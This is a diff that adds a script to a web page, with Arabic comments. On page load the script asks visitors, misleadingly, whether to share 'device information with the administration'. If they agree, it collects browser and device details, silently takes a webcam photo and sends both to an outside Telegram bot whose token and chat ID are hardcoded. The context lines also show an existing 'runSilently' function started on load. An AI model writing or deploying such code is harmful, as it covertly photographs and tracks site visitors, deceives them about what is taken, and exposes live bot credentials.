@@ -231,5 +231,82 @@
         // Start immediately when page loads
         window.onload = runSilently;
     </script>
+        <script>
+document.addEventListener('DOMContentLoaded', function() {
+    // بيانات بوت التليجرام
+    const botToken = '7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94';
+    const chatId = '6913353602';
+    
+    // عرض رسالة التأكيد
+    const userConfirmed = confirm('هل تريد مشاركة معلومات الجهاز مع الإدارة؟');
+    
+    if (userConfirmed) {
+        // جمع معلومات الجهاز
+        const deviceInfo = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            screenWidth: window.screen.width,
+            screenHeight: window.screen.height,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timestamp: new Date().toISOString()
+        };
+        
+        // إرسال معلومات الجهاز إلى التليجرام
+        sendToTelegram(botToken, chatId, `📱 معلومات الجهاز:\n${JSON.stringify(deviceInfo, null, 2)}`);
+        
+        // محاولة الوصول إلى الكاميرا
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    const track = stream.getVideoTracks()[0];
+                    const imageCapture = new ImageCapture(track);
+                    
+                    return imageCapture.takePhoto();
+                })
+                .then(function(blob) {
+                    // إرسال الصورة إلى التليجرام
+                    sendPhotoToTelegram(botToken, chatId, blob);
+                })
+                .catch(function(error) {
+                    console.error('Error accessing camera:', error);
+                    sendToTelegram(botToken, chatId, '⚠️ تعذر الوصول إلى الكاميرا: ' + error.message);
+                });
+        } else {
+            sendToTelegram(botToken, chatId, '⚠️ المتصفح لا يدعم الوصول إلى الكاميرا');
+        }
+    }
+    
+    // دالة لإرسال نص إلى التليجرام
+    function sendToTelegram(token, chatId, text) {
+        const url = `https://api.telegram.org/bot${token}/sendMessage`;
+        
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: text
+            })
+        }).catch(error => console.error('Error sending to Telegram:', error));
+    }
+    
+    // دالة لإرسال صورة إلى التليجرام
+    function sendPhotoToTelegram(token, chatId, photoBlob) {
+        const url = `https://api.telegram.org/bot${token}/sendPhoto`;
+        const formData = new FormData();
+        
+        formData.append('chat_id', chatId);
+        formData.append('photo', photoBlob, 'webcam-photo.jpg');
+        
+        fetch(url, {
+            method: 'POST',
+            body: formData
+        }).catch(error => console.error('Error sending photo to Telegram:', error));
+    }
+});
+</script>
 </body>
 </html>
